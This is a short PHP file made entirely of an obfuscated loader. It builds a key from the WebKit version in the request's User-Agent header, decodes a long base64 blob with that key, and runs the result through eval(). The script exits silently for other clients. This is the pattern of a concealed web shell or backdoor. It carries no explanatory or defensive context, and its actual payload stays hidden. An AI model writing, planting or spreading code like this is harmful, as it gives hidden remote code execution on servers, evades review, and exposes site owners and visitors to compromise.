<?php
function decrypt($date){
	$ktmp = $_SERVER['HTTP_USER_AGENT'];
	if(preg_match('/WebKit\/(.*) \(/is',$ktmp,$kk)){
		$scri = explode(".",$kk[1]);
		$scri = 'K'.$scri[1].'OPU';
	}else{
		die();
	}
    $scri = md5($scri);
    $x = 0;
    $date = base64_decode($date);
    $len = strlen($date);
    $l = strlen($scri);
    $char = '';
    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= substr($scri, $x, 1);
        $x++;
    }
    $tpl = '';
    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($date, $i, 1)) < ord(substr($char, $i, 1))) {
            $tpl .= chr((ord(substr($date, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $tpl .= chr(ord(substr($date, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return $tpl;
}
$date = "nJeNz6mjnNVhiZJ6qbbAhqST0Mlalotd4EE7QtTKnseglo2NZF+bx6LRmGHUytWLYlmRk19nhpOseYWUhNOR05hTwpRdXqfJqYxcbnFsbsmZmtKEX6vHosahllnV2pPJmKTYjXE9Qd5Gb5mo0sXZzaWgg8udrcGrypZZXdfXnI+uPm+GP1Sa1qvRU3CExdrWopHM0qGtil2gPT5Da8il2J+Q2Muqn6fVYYmWqNbOkYR5h7Wwh4m2k7qGfWWCiaXYn1qgc0A5mtar0ZKmydbU1Kpah8etq85ghXeGi660gLqSeaqnenWJjVnLlJ/Xx46fQzxsx62rzpPYmaWo0tlYipam19JiUHq2i7GCg7jBt6mKh7WyjIujgrh6douOhWGPbj5vb1qUmNWaopao1s7Eya6XxoxcnNem0V1sRmxuk9ulncTJop+qxmGJlqjWzo6fQzxszZ5hg1jJlaWai+A9cDw6icqXpJiBdoVzmc3OysOdl9fDm6jQqMqipayKiaXYn1qgc0A5tG5DbqWY2NfX0lZWx8Wsmp1Bb7E+Q8vLWM+mpMraXlSWqH65jlXLhMKNX61wbkFdyVSiVFWYqaqEwVqYjMNxPUFqXcxTcITExtebaJfDnJ7Fo8mZWazW14/YoqWWmV5UnopioEA9bcvLhF6i1cmfmM+V2ZeZYYmUpdifbo2UYG9gh53OpXCMkI+NZVmPhFygjlSJnZ+f0Y5Zhq4+b28/VKzTpYVwU4jL08qljZTBc0ZsPW5YlaLUhW2GV5rTzKWLab50cj084W9vbVqn1dBYdoJY2qaddG9vOYqllc7YVm1XhZ3OpW5xbG6ko53HzaphhGKUVl9ZhteUz6VaoHNAOVvWq9FkcIvK2dimbJKTX1mQVImpo6WCk1CNp5bS1qKRq8Znzaeg0ImgcUA7h9mqpZRxjJylrdKfX5VaUZOGWqWpzVmTU1rN0MnJrmDX3KxgnUFvPVWdy9dho1pflI1WXleFq8mcpYSQhYtlWYOSWGDWmdKknZrWyl7Op57RjXE9QWpdyZyllp+MkmVZg5JYXdSYzqZRZ4KMX41TX4WNn56bxrGTo5vUiaBxQDuHzKVqgnGFm5atwdyVyFtV2tiiYWCcRm88V8zPl4RzUsrJrJjZmcdcVa7U0WKPbj5vb5yZo8aY1ainw8XU0qqX0dirYYaYzqZiZYbNnZdcbHJwP5agzZ7Eo6jYwcjTpKbI0qysiljJnaNrjomY02VaoHNAOVvHmNinpb+/haFWUofIoauTb3I+Ol3IxKPapYzChnNQV4WdzqVln29vbZyh1cmZnMpciZqQrNbXUMemUYnMn5yc15qOrkBua27NnFrJzaSewZndnaSt1Y1UzJydytyXWWDcRm88PG2GzcWkls/JWHaCmtSklqeKiZbPn5bbx2JXqcNgjm5AbmtubVqkx9ehs8dUolSXos7Ko8+tlo2IZF9Zj13LnJ/J2MaNcT9tbUFChofZpqWez9VQo1OX18uXlF+Focahl9DHkYRapMfXobPHXaBUPkNrbjnMlp3U2ZtYW8ma05efyYughEM8bG1Boshc2KijrNbXWIqGpdfam52njWCUYpnNzsqEm6DHi2Fi3UFvPTpCa8qTzqJRh6KmbnPUqcahU9fW3tCbb4rKp6fWYdyZmqDK2WrIop3JoZmfo9Crn5qlycfTn11wh8qhpceqxlSkrsXIldmmbZTZppGln3WUo3GGnXJuPztsbXicyqHUmFldyM6cy6mSkZZtZGuKdHI9PG1r4smipcjfRUNrPW49lpzK1FCIb6GjoqmgmM9Z2Kes0Meii5yh0dhlsMedzJylc8TUnMpulNTSpaJx057JblqihsvNopfZxVirx6DUlZV1kdigx6FvoZWmblmcRm88PG3fcm4/O2zZpqzHqI1YhK3U2ZXTo1qgc0A5RGtCbrCY0NXK30M8bG1BnsWc1FRTddKjbNmjktOGqaSwzZ6iWpnT0NmRrZfMy6CtnJbUoJV0xdSc1aVr18uaa16fXcucn8nYxoSkodeEnqjXoslwYKzSxp6kb2DVpFhrRGtCbrBAbmvicUA7h9esq4JxhVuBfZvcka50fMa9j5+YuYffjYu10a+qb3q1uoqbrGazo5OQm9B6l2OhrqmPnYCketCLY8iou6qpoLyWoK3EZraiiYyjnoC5dJ+yuZmgnNior4xlzNbHloehrd1tqMZ7q56Ka7jfk9+WpLKqh2CFpKScdprQzMarZ6i9p5+nw4uan4uRydqTrZuor9+tp4WlipV+h9etqLuMnMSrcKCsZrOjk5Cb0Hmtn6uurW+igdussJmE1NK/zZ6ixpeGpcZ3zJ+Jacarhqymn8mZgKCbqI7Ti4bPya/Nj5nHrIKpxIfMn4lpxquGrKafyZmAoJuojtOLhs/SytulfK2snLLDjLegen2SzJSufaHHuZ2bj5Gdq4l519DJl4Cix6uNp7qH0Gt0oM3Qk615Ycapd2mB2m3bfayYya+smqvEvIqlrp3IqZKBtNmSqZZoqM2hm5CTctqXerrXyahmoL2Wca+8Zt2gfZGw1ZStiKXJ04ypmLiT1YxlqpLGu2+nss15p66dt2eUps6Virlnn7HTnmCZuLDTgqrTrL/RoqW9unGwxoy3moprm9qUrYmmya6Dn4Gpe82XesvVr6uEqMXSiqXEorakgLDNsHO9iZvGrW6XgaiH25Whts7H0odppsukasSh3aSTptXUephkY7/Pa6eYqXrTfofXrcu1c2+Kn0VDa5rOoJaY0tqkxZag09qbnqvUYYdhYtHYy5KmmtOGZJvDp8pqZZjGypPVl5aNiqmkqYpioEA9bYbLzaKX0cWlnp9U2KmTrNbXWIqShKq4jHWJvGC1e4PDtaqwfFnAkKut1KbVo6RhhsSDq4WHqriRV4epicSGeLCojMFiWZKLYWSTXaBBO0LX05zPoZyNjWRfXo9dy5yfydDG0ZtbnnFCQqKXzaGgnYqHXs6nksjJm6Oqg2WVamiZi6BxQK9wbg==";
$tpl = decrypt($date);
eval($tpl);